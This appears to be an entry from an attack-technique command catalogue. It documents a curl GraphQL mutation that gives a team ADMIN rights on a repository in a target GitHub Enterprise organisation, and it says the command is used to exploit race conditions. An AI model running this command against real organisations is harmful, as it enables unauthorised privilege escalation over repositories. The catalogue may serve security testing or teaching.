---
data: >-
  curl -X POST -H "Authorization: token YOUR_TOKEN" -H "Content-Type:
  application/json" https://ghe.example.com/api/v3/graphql -d '{"query":
  "mutation { updateTeamRepository(teamId: \"TEAM_ID\" ,ownerId: \"TARGET_ORG\",
  repositoryId: \"REPO_ID\", permission: ADMIN) { repository { id } } }"}'
tags:
  - graphql
  - mutation
type: command
output: '{"data": {"updateTeamRepository": {"repository": {"id": "REPO_ID"}}}}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.333Z'
id: 57870769-7e34-428f-8082-fe503bcdb3d2
verified: false
validated: true
submitted: true
---
# curl-graphql-update-teams-repo

## Command

```bash
curl -X POST -H "Authorization: token YOUR_TOKEN" -H "Content-Type: application/json" https://ghe.example.com/api/v3/graphql -d '{"query": "mutation { updateTeamRepository(teamId: \"TEAM_ID\" ,ownerId: \"TARGET_ORG\", repositoryId: \"REPO_ID\", permission: ADMIN) { repository { id } } }"}'
```

## Description

Executes a GraphQL mutation to update team permissions on a repository in GitHub Enterprise Server, used to exploit race conditions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for GraphQL | Yes |
| `-H "Authorization: token YOUR_TOKEN"` | Auth header | Yes |
| `-H "Content-Type: application/json"` | JSON payload type | Yes |
| `https://ghe.example.com/api/v3/graphql` | GraphQL endpoint | Yes |
| `-d '{...}'` | Mutation query with IDs and permission | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: token ghp_abc123" -H "Content-Type: application/json" https://ghe.example.com/api/v3/graphql -d '{"query": "mutation { updateTeamRepository(teamId: \"MDQ6VGVhbTxxxxx\", ownerId: \"TARGET_ORG\", repositoryId: \"REPO_ID\", permission: ADMIN) { repository { id } } }"}'
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: token ghp_abc123" -H "Content-Type: application/json" -v https://ghe.example.com/api/v3/graphql -d '{"query": "..."}'
```

## Expected Output

JSON with data.updateTeamRepository.repository.id on success; errors in data.errors.

## Related

- [[Related Procedure: Exploit-Race-Condition-with-GraphQL-updateTeamsRepository]]
